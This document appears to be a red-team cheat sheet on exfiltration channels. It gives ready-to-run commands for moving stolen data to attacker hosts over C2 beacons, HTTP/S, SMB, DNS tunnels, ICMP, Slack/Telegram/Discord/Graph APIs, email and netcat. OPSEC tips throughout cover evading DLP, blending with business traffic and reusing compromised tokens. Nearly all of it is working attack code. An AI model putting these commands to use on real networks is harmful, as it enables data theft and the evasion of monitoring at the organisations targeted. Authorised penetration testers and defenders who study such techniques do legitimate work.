## Exfiltration Channels

Selecting the right exfil channel based on network restrictions, data volume, and OPSEC requirements. Start with the simplest method (C2 channel) and escalate complexity only as needed.

> **OPSEC:** Exfil during business hours to blend with normal traffic. Throttle transfer rates. Encrypted/password-protected archives defeat DLP content inspection. See [[a. Data Staging & Preparation]] for staging and encryption.

---
### C2 Channel (Default)

The simplest option — exfil data over the existing beacon channel. No new network connections.

#### Cobalt Strike
```sh
# Download file from target
beacon> download C:\ProgramData\data.7z

# Check progress / cancel
beacon> downloads
beacon> cancel <download_id>
```

> **OPSEC:** Bandwidth is limited by sleep interval. Large files will be very slow on high-sleep beacons. Temporarily lower sleep for bulk transfers, then restore.

```sh
beacon> sleep 5 50
# ... download ...
beacon> sleep 60 30
```

#### Sliver
```sh
# Download file
sliver> download C:\ProgramData\data.7z /tmp/loot/

# Download directory
sliver> download C:\ProgramData\staging\ /tmp/loot/ -r
```

> **Note:** C2 exfil is best for small-to-medium volumes (< 100 MB). For larger data, use a dedicated channel.

---
### HTTP/S

POST data to an attacker-controlled web server. Works through corporate proxies.

#### Manual
```sh
# cURL — POST file
curl -X POST -F "file=@data.7z" https://exfil.attacker.com/upload

# cURL — raw binary POST
curl -X POST --data-binary @data.7z https://exfil.attacker.com/upload

# wget — POST file
wget --post-file=data.7z https://exfil.attacker.com/upload
```
```powershell
# PowerShell — Invoke-WebRequest POST
Invoke-WebRequest -Uri https://exfil.attacker.com/upload -Method POST -InFile C:\ProgramData\data.7z

# PowerShell — .NET WebClient (proxy-aware by default)
$wc = New-Object System.Net.WebClient
$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
$wc.UploadFile("https://exfil.attacker.com/upload", "C:\ProgramData\data.7z")

# certutil — download (pull-based exfil from attacker perspective)
certutil -urlcache -split -f http://attacker.com/data.7z C:\ProgramData\data.7z
```

> **OPSEC:** HTTP/S through a corporate proxy is noisy if the destination isn't categorised. Use domain fronting or categorised domains where possible. WebClient automatically uses system proxy + credentials.

---
### SMB

Mount attacker SMB share and copy files directly. Best for internal pivots and lab environments.

#### Manual
```sh
# Windows — map attacker share
net use \\ATTACKER_IP\share /user:user password
copy C:\ProgramData\data.7z \\ATTACKER_IP\share\
net use \\ATTACKER_IP\share /delete

# Windows — UNC path without mapping
copy C:\ProgramData\data.7z \\ATTACKER_IP\share\data.7z
```
```sh
# Linux — mount SMB share
mount -t cifs //ATTACKER_IP/share /mnt -o username=user,password=pass
cp /dev/shm/.cache/data.tar.gz /mnt/
umount /mnt

# smbclient
smbclient //ATTACKER_IP/share -U user%pass -c "put data.tar.gz"
```

> **OPSEC:** SMB (TCP 445) is typically blocked outbound at the perimeter. Use for lateral movement / internal exfil only. Consider SMB over SSH tunnels for external exfil.

---
### DNS

Encode data into DNS queries. Very low bandwidth but high stealth — ideal for restricted networks where only DNS is allowed.

#### Manual
```sh
# Manual DNS exfil — base64 chunks as subdomain labels
# Receiver: attacker authoritative DNS server logging queries
data=$(cat secret.txt | base64 -w 0)
for chunk in $(echo $data | fold -w 60); do
    nslookup $chunk.exfil.attacker.com
done

# dnscat2 — full tunnel
# Server (attacker)
ruby dnscat2.rb exfil.attacker.com

# Client (target)
./dnscat2 exfil.attacker.com

# iodine — IP-over-DNS tunnel
# Server
iodined -f -P password 10.0.0.1 tunnel.attacker.com

# Client
iodine -f -P password tunnel.attacker.com
```

> **OPSEC:** DNS exfil is slow (< 1 KB/s practical). Best for small, critical data (credentials, keys). Long subdomain labels and high query volume may trigger DNS monitoring. Use short labels and throttle queries.

---
### ICMP

Encode data in ICMP echo request payloads. Extremely low bandwidth.

#### Manual
```sh
# Linux — ping with data payload
xxd -p secret.txt | fold -w 32 | while read line; do
    ping -c 1 -p "$line" ATTACKER_IP
done

# Receiver — capture ICMP data on attacker
tcpdump -i eth0 icmp -w icmp_exfil.pcap
# Extract payloads from pcap post-capture
```

> **OPSEC:** ICMP is often allowed outbound but rarely inspected. Extremely low bandwidth — only useful for small data (hashes, keys, short strings).

---
### Cloud Services

Exfil through legitimate SaaS services to blend with normal corporate traffic. Especially effective when the target organisation already uses these services.

#### Manual
```sh
# Slack — file upload via API
curl -F "file=@data.7z" -F "channels=CHANNEL_ID" -H "Authorization: Bearer xoxb-TOKEN" https://slack.com/api/files.upload

# Telegram bot
curl -F "document=@data.7z" "https://api.telegram.org/botTOKEN/sendDocument?chat_id=CHAT_ID"

# Discord webhook
curl -F "file=@data.7z" https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN
```
```powershell
# OneDrive / SharePoint — upload via Graph API (if org uses M365)
$token = "<access_token>"
$headers = @{ Authorization = "Bearer $token"; "Content-Type" = "application/octet-stream" }
$uri = "https://graph.microsoft.com/v1.0/me/drive/root:/exfil/data.7z:/content"
Invoke-RestMethod -Uri $uri -Method PUT -Headers $headers -InFile C:\ProgramData\data.7z
```

> **OPSEC:** Cloud exfil is highly effective when the org already uses the platform — traffic blends with legitimate usage. Use compromised user tokens where available to avoid anomalous auth patterns.

---
### Email (SMTP)

Exfil via compromised mailbox or mail relay. Low volume but blends with normal email traffic.

#### Manual
```powershell
# PowerShell — Send-MailMessage (deprecated but functional)
Send-MailMessage -From "user@target.com" -To "attacker@external.com" -Subject "Report" -Attachments "C:\ProgramData\data.7z" -SmtpServer mail.target.com

# PowerShell — .NET SmtpClient
$smtp = New-Object Net.Mail.SmtpClient("mail.target.com")
$msg = New-Object Net.Mail.MailMessage("user@target.com", "attacker@external.com", "Monthly Report", "See attached.")
$msg.Attachments.Add("C:\ProgramData\data.7z")
$smtp.Send($msg)
```
```python
# Python SMTP
import smtplib
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email import encoders

msg = MIMEMultipart()
msg['From'] = 'user@target.com'
msg['To'] = 'attacker@external.com'
msg['Subject'] = 'Quarterly Report'

part = MIMEBase('application', 'octet-stream')
part.set_payload(open('data.7z', 'rb').read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', 'attachment; filename="report.7z"')
msg.attach(part)

s = smtplib.SMTP('mail.target.com', 25)
s.send_message(msg)
s.quit()
```

> **OPSEC:** Email has strict attachment size limits (usually 10-25 MB). DLP may inspect attachments — encrypt archives. Use realistic subject lines and recipients.

---
### FTP / SCP / Netcat

Direct file transfer protocols. Useful when you have raw network access.

#### Manual
```sh
# SCP — upload to attacker
scp data.tar.gz attacker@ATTACKER_IP:/tmp/loot/
scp -P 2222 data.tar.gz attacker@ATTACKER_IP:/tmp/loot/

# FTP
ftp ATTACKER_IP
> put data.7z
> bye

# Netcat — raw transfer
# Attacker (listener)
nc -lvp 4444 > received_data.7z

# Target (sender)
nc ATTACKER_IP 4444 < data.7z
```

> **OPSEC:** FTP and raw netcat are unencrypted — avoid on monitored networks. SCP is encrypted but creates outbound SSH connections which may be flagged.

---
### Channel Selection Guide

| Channel | Bandwidth | Stealth | Proxy-Aware | Best For |
|---------|-----------|---------|-------------|----------|
| C2 channel | Low | High | Yes | Small files, default option |
| HTTP/S | High | Medium | Yes | Bulk data through proxy |
| SMB | High | N/A | No | Internal / lateral pivots |
| DNS | Very low | High | N/A | Restricted networks, small data |
| ICMP | Very low | Medium | No | Last resort, tiny data |
| Cloud SaaS | Medium | High | Yes | Blending with corporate traffic |
| Email | Low | Medium | Yes | Small files, covert |
| SCP/FTP | High | Low | No | Lab / unrestricted environments |
